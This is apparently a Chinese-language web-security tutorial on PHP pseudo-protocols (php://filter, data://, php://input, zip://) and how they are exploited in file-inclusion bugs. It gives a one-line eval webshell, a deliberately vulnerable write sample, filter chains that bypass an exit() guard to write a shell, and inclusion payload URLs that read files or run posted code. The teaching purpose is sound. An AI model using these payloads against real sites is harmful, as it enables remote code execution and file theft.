# php支持的伪协议
```
1 file:// — 访问本地文件系统
2 http:// — 访问 HTTP(s) 网址
3 ftp:// — 访问 FTP(s) URLs
4 php:// — 访问各个输入/输出流（I/O streams）
5 zlib:// — 压缩流
6 data:// — 数据（RFC 2397）
7 glob:// — 查找匹配的文件路径模式
8 phar:// — PHP 归档
9 ssh2:// — Secure Shell 2
10 rar:// — RAR
11 ogg:// — 音频流
12 expect:// — 处理交互式的流
```
## 1 php://filter
php://filter 是一种元封装器，设计用于，数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。
简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。
php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。

协议参数：

| 名称                   | 描述                                              |
| -------------------- | ----------------------------------------------- |
| `resource=<要过滤的数据流>` | 这个参数是必须的。它指定了你要筛选过滤的数据流。                        |
| `read=<读链的筛选列表>`     | 该参数可选。可以设定一个或多个过滤器名称，<br>以管道符（\|）分隔。            |
| `write=<写链的筛选列表>`    | 该参数可选。可以设定一个或多个过滤器名称，<br>以管道符（\|）分隔。            |
| `<；两个链的筛选列表>`        | 任何没有以 `read=` 或 `write=` 作前缀 的筛选器列表会视情况应用于读或写链。 |
常用：(convert是代码转换的意思)
```php
php://filter/read=convert.base64-encode/resource=index.php
php://filter/resource=index.php
```
利用filter协议读文件，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。
而使用的convert.base64-encode，就是一种过滤器。

### 过滤器
#### 字符串过滤器
该类通常以string开头，对每个字符都进行同样方式的处理。
##### string.rot13
一种字符处理方式，字符右移十三位。

##### string.toupper
将所有字符转换为大写。

##### string.tolower
将所有字符转换为小写。

##### string.strip_tags
这个过滤器就比较有意思，用来处理掉读入的所有标签，例如XML的等等。在绕过死亡exit大有用处。

#### 转换过滤器
对数据流进行编码，通常用来读取文件源码。

`convert.base64-encode & convert.base64-decode`
base64加密解密

`convert.quoted-printable-encode & convert.quoted-printable-decode`
可以翻译为可打印字符引用编码，使用可以打印的ASCII编码的字符表示各种编码形式下的字符。

#### 压缩过滤器
注意：这里的压缩过滤器指的并不是在数据流传入的时候对整个数据进行写入文件后压缩文件，也不代表可以压缩或者解压数据流。压缩过滤器不产生命令行工具如`gzip`的头和尾信息。只是压缩和解压数据流中的有效载荷部分。
用到的两个相关过滤器：`zlib.deflate`（压缩）和 `zlib.inflate`（解压）。zilb是比较主流的用法，至于`bzip2.compress`和 `bzip2.decompress`工作的方式与 zlib 过滤器大致相同。

#### 加密过滤器
`mcrypt.*`和 `mdecrypt.*`使用 libmcrypt 提供了对称的加密和解密。

### 利用filter伪协议绕过死亡exit
#### 什么是死亡exit
死亡exit指的是在进行写入PHP文件操作时，执行了以下函数：
```php
file_put_contents($content, '<?php exit();' . $content);
或
file_put_contents($content, '<?php exit();?>' . $content);
```
这样，当你插入一句话木马时，文件的内容是这样子的：
```php
<?php exit();?>
<?php @eval($_POST['snakin']);?>
```
这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配置文件等等不允许用户直接访问的文件当中。
#### base64decode绕过
利用filter协议来绕过，看下这样的代码：
```php
<?php
$content = '<?php exit; ?>';
$content .= $_POST['txt'];
file_put_contents($_POST['filename'], $content);
```
当用户通过POST方式提交一个数据时，会与死亡exit进行拼接，从而避免提交的数据被执行。
然而这里可以利用php://filter的base64-decode方法，将`$content`解码，利用php base64_decode函数特性去除死亡exit。
base64编码中只包含64个可打印字符，当PHP遇到不可解码的字符时，会选择性的跳过，这个时候base64就相当于以下的过程：
```php
<?php
$_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);
base64_decode($_GET['txt']);
```
>题外话：解释一下第二句：在传入的txt中将符合pattern的删除（替换为空字符串）
>`preg_replace (mixed $pattern ,mixed $replacement ,mixed $subject)`
>**搜索`subject`中匹配`pattern`的部分， 以`replacement`进行替换。**
> >`|`是分隔符
> >**`[^...]`**：这是一个否定字符类，它与括号内未列出的任何字符匹配。
> >`s` 修饰符：此修饰符允许pattern中的点 `.`也匹配换行符，但由于这里的pattern不直接使用点，因此在这种情况下，该修饰符没有实际效果。

所以，当`$content`包含`<?php exit; ?>`时，解码过程会先去除识别不了的字符，`< ; ? >`和`空格`等都将被去除，于是剩下的字符就只有`phpexit`以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符`'a'`后，将`'phpexita'`当做两组base64进行解码，也就绕过这个死亡exit了。
这个时候后面再加上编码后的一句话木马，就可以getshell了。

#### strip_tags绕过
这个`<?php exit; ?>`实际上是一个XML标签，既然是XML标签，我们就可以利用`strip_tags`函数去除它，而php://filter刚好是支持这个方法的。
但是我们要写入的一句话木马也是XML标签，在用到strip_tags时也会被去除。
注意到在写入文件的时候，filter是支持多个过滤器的。可以先将webshell经过base64编码，strip_tags去除死亡exit之后，再通过base64-decode复原。
```php
php://filter/string.strip_tags|convert.base64-decode/resource=shell.php
```

## 2 data://
数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。
示例用法：
```php
data://text/plain,
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
 
data://text/plain;base64,
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```

Example #1 打印 data:// 的内容
```php
<?php
// 打印 "I love PHP"
echo  file_get_contents ( 'data://text/plain;base64,SSBsb3ZlIFBIUAo=' );
?>
```

Example #2 获取媒体类型
```php
<?php
$fp    =  fopen ( 'data://text/plain;base64,' ,  'r' );
$meta  =  stream_get_meta_data ( $fp );

// 打印 "text/plain"
echo  $meta [ 'mediatype' ];
?>
```

## 3 file://
用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响
`file://`协议主要用于访问文件(绝对路径、相对路径以及网络路径)
比如：`http://www.xx.com?file=file:///etc/passsword`

## 4 php://
在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用  
php://作用为访问输入输出流

## 5 php://input
php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。
例如：
`http://127.0.0.1/cmd.php?cmd=php://input`
POST数据：`<?php phpinfo()?>`
注意：
当enctype="multipart/form-data"的时候 php://input是无效的

遇到file_get_contents()要想到用php://input绕过。

## 6 zip://
zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。
1. zip://中只能传入绝对路径。
2. 要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）
3. 只需要是zip的压缩包即可，后缀名可以任意更改。
4. 相同的类型的还有zlib://和bzip2://
